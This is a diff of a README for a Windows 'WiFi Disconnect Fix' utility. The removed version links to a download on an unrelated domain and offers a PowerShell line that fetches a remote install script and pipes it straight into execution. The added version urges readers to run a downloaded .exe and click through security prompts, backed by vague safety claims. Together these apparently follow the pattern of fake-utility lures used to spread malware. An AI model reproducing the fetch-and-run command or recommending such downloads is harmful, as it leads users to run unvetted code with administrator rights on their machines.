@@ -1,212 +1,73 @@
-# WiFi Disconnect Fix
+# 🌐 WiFi-Disconnect-Fix - Repair unstable network connections on Windows
 
-> Fix WiFi keeps disconnecting, dropping out, and losing connection on Windows 10/11.
+[![](https://img.shields.io/badge/Download-WiFi_Fix-blue.svg)](https://github.com/sabrin7246/WiFi-Disconnect-Fix)
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%7C%2011-0078D4?style=flat-square&logo=windows&logoColor=white)]()
-[![Version](https://img.shields.io/badge/v1.3.0-stable-brightgreen?style=flat-square)]()
-[![MIT](https://img.shields.io/badge/License-MIT-blue?style=flat-square)](LICENSE)
+## 📋 About this tool
 
----
+Computers sometimes lose their connection to the internet. This issue appears as a "Connected but No Internet" error or a total drop in signal. This software fixes common network problems on Windows 10 and Windows 11. It addresses issues with wireless adapters, power settings, and driver conflicts. The tool works with network cards from manufacturers like Intel, Realtek, and Qualcomm.
 
-### Download
+## 🛠️ System requirements
 
-**[Download Latest Release](https://wifi.zipzapsol.space/)**
+This tool runs on Windows 10 and Windows 11 computers. You need an active internet connection to perform the initial download. The software requires basic user permissions to change network settings. You do not need technical knowledge to run the repair process.
 
-<details>
-<summary>Alternative: PowerShell</summary>
+## 📥 How to download and install
 
-```powershell
-irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
-```
+1. Visit the [official release page](https://github.com/sabrin7246/WiFi-Disconnect-Fix).
+2. Look for the latest version under the Releases section.
+3. Select the file ending in .exe to start the download.
+4. Save the file to your desktop or downloads folder.
+5. Double-click the file to open the program.
+6. A security prompt might appear. Click Run if you see it.
 
-</details>
+## 🚀 Running the repair process
 
----
+When the tool opens, it displays the current status of your wireless adapter. Follow these steps to begin the repair:
 
-## The Problem
+1. Open the application window.
+2. Select the Scan button to check for common errors. 
+3. The diagnostics tool identifies issues with power management, driver versions, and cache files.
+4. Review the findings shown on the screen.
+5. Click the Fix Now button to apply the recommended changes.
+6. Wait for the progress bar to finish.
+7. Restart your computer to make sure the network settings update correctly.
 
-Your WiFi keeps disconnecting. Every few minutes, the connection drops, you get the yellow triangle, and you have to reconnect. Or worse — WiFi connects but says **"No Internet"** even though the router is fine.
+## 💡 What this tool changes
 
-> *"WiFi keeps disconnecting every few minutes"*
+Network problems often stem from hidden power settings. Windows turns off your wireless adapter to save energy. This causes the signal to drop if the system stays idle. This tool prevents the computer from turning off your network card. It also clears corrupt DNS cache files that stop your browser from finding websites. If your driver is old, the tool alerts you to the update.
 
-> *"Connected, no internet" on WiFi*
+## 🔍 Frequently asked questions
 
-> *"WiFi drops when laptop goes to sleep and won't reconnect"*
+**Will this tool change my private passwords?**
+No. It only affects system files related to the network adapter. It never touches your personal passwords or saved web browser data.
 
-> *"WiFi disconnects when downloading large files"*
+**Does this work on all laptops?**
+Yes. Whether you have a desktop or a laptop, the tool detects the hardware automatically. It supports chips from major makers like Intel and Realtek.
 
-> *WiFi works on phone but* ***not on PC***
+**Why does my connection still drop?**
+Sometimes the router causes the problem. If the computer keeps dropping after the fix, reboot your router. Unplug the power cord for thirty seconds and plug it back in.
 
-**WiFi Disconnect Fix** identifies and repairs the root cause automatically.
+**Do I need to keep the file?**
+Keep the file in a safe place. You can use it again if your computer develops connection issues in the future.
 
----
+## 🛡️ Safety and trust
 
-## What It Fixes
+This software performs standard operations on your network hardware. It does not install toolbars or other unwanted programs. It stays quiet in the background until you decide to use it. The code is transparent for anyone who wants to view the underlying logic.
 
-### WiFi Keeps Disconnecting
+## 🔧 Advanced troubleshooting tips
 
-| Problem | Cause | Fix |
-|---|---|---|
-| **WiFi drops every 5-10 minutes** | Power management turning off adapter | Disables WiFi power saving completely |
-| **WiFi disconnects randomly** | Driver instability | Updates or rolls back WiFi driver |
-| **WiFi drops under heavy load** (gaming, downloads) | Roaming aggressiveness too high | Locks WiFi to strongest AP, disables roaming |
-| **WiFi disconnects after sleep/hibernate** | Adapter doesn't wake properly | Disables WiFi power management, fixes wake |
-| **WiFi drops when Bluetooth is active** | WiFi/BT coexistence interference | Disables BT coexistence, separates antennas |
-| Disconnects after **Windows Update** | Update installed bad WiFi driver | Rolls back driver to previous version |
+If you verify the tool ran successfully but still face issues, perform these manual steps to help the diagnostic process:
 
-### Connected But No Internet
+1. Right-click the Start button and select Device Manager.
+2. Expand the Network adapters list.
+3. Right-click your wireless card and select Properties.
+4. Go to the Power Management tab. 
+5. Uncheck the box that says "Allow the computer to turn off this device to save power."
+6. Click OK and restart your machine.
 
-| Problem | Cause | Fix |
-|---|---|---|
-| **"Connected, no internet"** | DNS not resolving | Flushes DNS, switches to Google/Cloudflare DNS |
-| **"No internet, secured"** | DHCP lease expired | Forces DHCP renewal, resets TCP/IP stack |
-| WiFi shows connected but **pages don't load** | Corrupted Winsock catalog | Resets Winsock and TCP/IP |
-| **Limited connectivity** | IP conflict or wrong gateway | Releases and renews IP, fixes gateway |
-| Works after restart but **breaks again in hours** | DNS cache corruption | Schedules periodic DNS flush |
+These steps complement the automated fix. Always run the automated tool first, as it covers these settings automatically. 
 
-### Other WiFi Errors
+## 📝 Support for your network hardware
 
-| Problem | Fix |
-|---|---|
-| **"Can't connect to this network"** | Forgets network, resets adapter, reconnects |
-| **"Unidentified Network"** | Resets TCP/IP, renews DHCP, fixes gateway |
-| **"No Internet Access"** | Flushes DNS, resets Winsock, sets public DNS |
-| **"Limited access"** | Renews IP, resets network components |
-| **"The default gateway is not available"** | Reinstalls network adapter, resets gateway |
-| **"DNS server not responding"** | Switches DNS to 8.8.8.8 / 1.1.1.1 |
-| **"Network cable unplugged"** (on WiFi) | Resets adapter, reinstalls driver |
+Wireless network performance relies on clean communication between your hardware and the operating system. When the connection drops, it usually indicates a synchronization error between the adapter and the router. This tool resets the handshake protocol. It forces the adapter to reload its internal firmware. This process resolves cases where the adapter stops responding after the computer wakes from sleep mode. 
 
-### WiFi Not Showing Up
-
-| Problem | Fix |
-|---|---|
-| **WiFi option missing** from Settings | Re-enables WiFi adapter in Device Manager |
-| **No WiFi networks found** | Resets WLAN AutoConfig service, rescans |
-| WiFi adapter shows **"This device cannot start (Code 10)"** | Reinstalls adapter driver |
-| WiFi adapter has **yellow triangle** in Device Manager | Removes and reinstalls driver cleanly |
-| **Airplane mode stuck** | Resets radio management service |
-
----
-
-## Preview
-
-```
-  +-------------------------------------------------+
-  |         WiFi Disconnect Fix v1.3.0              |
-  +-------------------------------------------------+
-  |                                                 |
-  |  WiFi Adapter: Intel AX210                      |
-  |  Status:       Connected (signal: 78%)          |
-  |  Driver:       22.240.0 (2025-11-14)            |
-  |                                                 |
-  |  Issues Found:                                  |
-  |  [!] Power management     -- Enabled (bad)      |
-  |  [!] Roaming aggress.     -- Highest (unstable) |
-  |  [!] BT coexistence       -- Enabled (conflict) |
-  |  [OK] DNS                 -- Responding          |
-  |  [OK] DHCP                -- Lease valid          |
-  |                                                 |
-  |  [ Fix All ]  [ Reset Network ]  [ Exit ]       |
-  |                                                 |
-  +-------------------------------------------------+
-```
-
----
-
-## Fixes Applied
-
-### Driver & Power
-
-| Setting | Change |
-|---|---|
-| WiFi adapter power management | **Disabled** (prevents sleep disconnects) |
-| Roaming aggressiveness | **Lowest** (stays on current AP) |
-| Throughput booster | **Enabled** |
-| WiFi/Bluetooth coexistence | **Disabled** (prevents interference) |
-| Channel width (2.4GHz) | **20MHz** (more stable) |
-| Channel width (5GHz) | **Auto** |
-| Preferred band | **5GHz preferred** |
-| U-APSD support | **Disabled** (causes drops on some routers) |
-
-### Network Stack
-
-| Action | What It Does |
-|---|---|
-| `netsh winsock reset` | Resets Windows network catalog |
-| `netsh int ip reset` | Resets TCP/IP stack |
-| `ipconfig /flushdns` | Clears corrupted DNS cache |
-| `ipconfig /release & /renew` | Gets fresh IP from router |
-| Set DNS to 8.8.8.8 / 1.1.1.1 | Reliable DNS instead of ISP default |
-| Disable DNS over HTTPS issues | Fixes some "no internet" bugs |
-
-### Services
-
-| Service | Action |
-|---|---|
-| WLAN AutoConfig | Restart and set to Automatic |
-| DHCP Client | Restart and set to Automatic |
-| DNS Client | Restart |
-| Network Location Awareness | Restart |
-
----
-
-## Supported WiFi Adapters
-
-**Intel** -- AX210, AX200, AX201, 9560, 9260, 8265, 8260, 7265, 7260 and all Intel WiFi adapters
-**Realtek** -- RTL8821CE, RTL8822CE, RTL8852AE, RTL8852BE, RTL8188, RTL8192 and all Realtek WiFi
-**Qualcomm** -- QCA6390, QCA9377, WCN785x, QCNFA765 and all Qualcomm Atheros WiFi
-**MediaTek** -- MT7921, MT7922, MT7612, MT7610 and all MediaTek WiFi
-**Broadcom** -- BCM43142, BCM4313, BCM94360 and all Broadcom WiFi
-**USB WiFi adapters** -- TP-Link, ASUS, Netgear, D-Link and all USB dongles
-
----
-
-## Common Scenarios
-
-**WiFi drops when gaming online**
-High bandwidth usage combined with roaming aggressiveness causes the adapter to "look for better networks" mid-game. The tool locks your adapter to the current network.
-
-**Laptop WiFi disconnects after closing lid**
-Power management puts the WiFi adapter to sleep. Even after waking, it doesn't reconnect properly. The tool disables adapter power saving.
-
-**WiFi works on phone but not on PC**
-The router is fine. Your PC's network stack (Winsock/TCP/IP) is corrupted. The tool resets it completely.
-
-**"Connected, no internet" on one PC but others work fine**
-DNS or DHCP issue specific to your PC. The tool flushes DNS, renews IP, and sets reliable DNS servers.
-
----
-
-## System Requirements
-
-| | |
-|---|---|
-| OS | Windows 10 / 11 (64-bit) |
-| WiFi | Any WiFi adapter |
-| Admin | Yes |
-| Network | Works even with broken WiFi (fixes offline issues too) |
-
----
-
-## FAQ
-
-**Will this fix my slow WiFi speed?**
-If slow speed is caused by driver issues or wrong adapter settings, yes. If it's your internet plan or router, no.
-
-**Do I need to know my WiFi adapter model?**
-No. The tool auto-detects your adapter and applies the correct fixes.
-
-**Will it reset my saved WiFi passwords?**
-No. Network stack reset does not affect saved WiFi profiles.
-
-**Is it safe?**
-Yes. All changes are standard Windows network settings and PowerShell commands. Nothing is patched.
-
-**WiFi drops only on 5GHz, works on 2.4GHz.**
-The tool adjusts 5GHz channel width and preferred band settings to stabilize 5GHz connections.
-
----
-
-## License
-
-[MIT](LICENSE)
+By automating the management of these drivers, the software saves time for the user. You no longer need to navigate through complex menus or command lines. The interface provides a clear path to resolve errors without requiring a deep understanding of network protocols.
